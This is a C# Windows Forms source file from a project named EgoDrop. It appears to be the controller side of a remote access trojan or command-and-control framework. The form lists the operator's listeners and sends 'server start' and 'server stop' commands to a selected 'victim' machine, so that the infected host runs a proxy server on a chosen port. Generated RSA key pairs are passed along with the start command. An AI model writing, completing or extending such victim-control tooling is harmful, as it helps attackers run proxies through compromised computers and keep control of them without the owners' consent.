using EgoDrop.Properties;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace EgoDrop
{
    public partial class frmServerProxy : Form
    {
        private string m_szVictimID { get; set; }
        private clsVictim m_victim { get; init; }
        private string m_szIPv4 { get; set; }

        public Dictionary<string, clsListener> m_dicListener = new Dictionary<string, clsListener>();

        public frmServerProxy(string szVictimID, clsVictim victim, Dictionary<string, clsListener> dicListener, string szIPv4)
        {
            InitializeComponent();

            m_szVictimID = szVictimID;
            m_victim = victim;
            m_dicListener = dicListener;
            m_szIPv4 = szIPv4;
        }

        void fnSetup()
        {
            toolStripComboBox1.Items.AddRange(new string[]
            {
                m_szIPv4,
                "0.0.0.0",
            });
            toolStripComboBox1.SelectedIndex = 0;

            foreach (string szName in m_dicListener.Keys)
            {
                var listener = m_dicListener[szName].m_stListener;

                ListViewItem item = new ListViewItem(szName);
                item.SubItems.Add(Enum.GetName(listener.protoListener));
                item.SubItems.Add(listener.nPort.ToString());
                item.SubItems.Add("Please wait...");
                item.SubItems.Add(listener.szDescription);

                listView1.Items.Add(item);
            }

            toolStripStatusLabel1.Text = $"Listener[{listView1.Items.Count}]";
        }

        private void frmServerProxy_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            /*
            clsCrypto crypto = new clsCrypto(true);
            m_victim.fnSendCommand(m_szVictimID, new string[]
            {
                "server",
                "start",
                ((int)numericUpDown1.Value).ToString(),

                Convert.ToBase64String(crypto.m_abRSAKeyPair.abPublicKey),
                Convert.ToBase64String(crypto.m_abRSAKeyPair.abPrivateKey),
            });
            */
        }

        private void button2_Click(object sender, EventArgs e)
        {
            m_victim.fnSendCommand(m_szVictimID, new string[]
            {
                "server",
                "stop",
            });
        }

        //Start
        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.CheckedItems)
            {
                string szName = item.Text;
                var listener = m_dicListener[szName].m_stListener;

                switch (listener.protoListener)
                {
                    case clsSqlite.enListenerProtocol.TCP:
                        clsCrypto crypto = new clsCrypto(true);
                        m_victim.fnSendCommand(m_szVictimID, new string[]
                        {
                            "server",
                            "start",
                            Enum.GetName(listener.protoListener),
                            listener.nPort.ToString(),

                            Convert.ToBase64String(crypto.m_abRSAKeyPair.abPublicKey),
                            Convert.ToBase64String(crypto.m_abRSAKeyPair.abPrivateKey),
                        });
                        break;
                    case clsSqlite.enListenerProtocol.TLS:

                        break;
                    case clsSqlite.enListenerProtocol.HTTP:

                        break;
                }
            }
        }

        private void toolStripButton2_Click(object sender, EventArgs e)
        {
            m_victim.fnSendCommand(m_szVictimID, new string[]
            {
                "server",
                "stop",
            });
        }

        //Check all.
        private void toolStripButton3_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.Items)
                item.Checked = true;
        }

        //Uncheck all.
        private void toolStripButton4_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.Items)
                item.Checked = false;
        }
    }
}
